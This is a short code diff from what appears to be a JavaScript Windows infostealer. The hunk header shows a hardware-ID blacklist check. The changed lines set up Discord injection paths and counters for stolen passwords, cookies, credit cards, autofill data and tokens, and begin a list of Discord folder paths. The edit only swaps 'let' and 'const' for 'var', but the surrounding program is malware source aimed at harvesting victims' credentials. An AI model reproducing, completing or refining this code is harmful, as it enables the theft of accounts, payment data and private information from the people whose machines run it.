@@ -36,20 +36,20 @@ if (hwidblack.includes(hwid)) {
 
 
 
-let appdata = process.env.APPDATA;
-let localappdata = process.env.LOCALAPPDATA;
-let LOCAL = process.env.LOCALAPPDATA
-let discords = [];
-let injectPath = [];
+var appdata = process.env.APPDATA;
+var localappdata = process.env.LOCALAPPDATA;
+var LOCAL = process.env.LOCALAPPDATA
+var discords = [];
+var injectPath = [];
 
-let passwordCount = 0;
-let cookieCount = 0;
-let ccCount = 0;
-let autofillCount = 0;
+var passwordCount = 0;
+var cookieCount = 0;
+var ccCount = 0;
+var autofillCount = 0;
 
 
-const all_founds = [];
-const tokens = [];
+var all_founds = [];
+var tokens = [];
 
 paths = [
   appdata + '\\discord\\',
